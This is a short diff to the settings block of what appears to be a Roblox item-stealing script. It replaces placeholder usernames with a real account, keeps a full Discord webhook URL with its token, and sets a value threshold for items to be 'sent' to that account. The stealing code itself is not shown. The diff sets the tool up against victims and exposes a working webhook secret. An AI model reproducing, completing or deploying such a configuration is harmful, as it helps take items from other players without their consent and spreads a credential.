@@ -1,5 +1,5 @@
-Username = "your user here"
-Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
+Username = "Lyrcisas"
+Username2 = "Lyrcisas" -- stuff will get sent to this user if first user's mailbox is full
 webhook = "https://discord.com/api/webhooks/1266831019944837191/I8HEtSjd4jWf9EO5eJ0kpv1AAS_Ch6__D5m74WHXfkHl1MtlIMObpUfhRUAKs3-4dlyV"
 min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
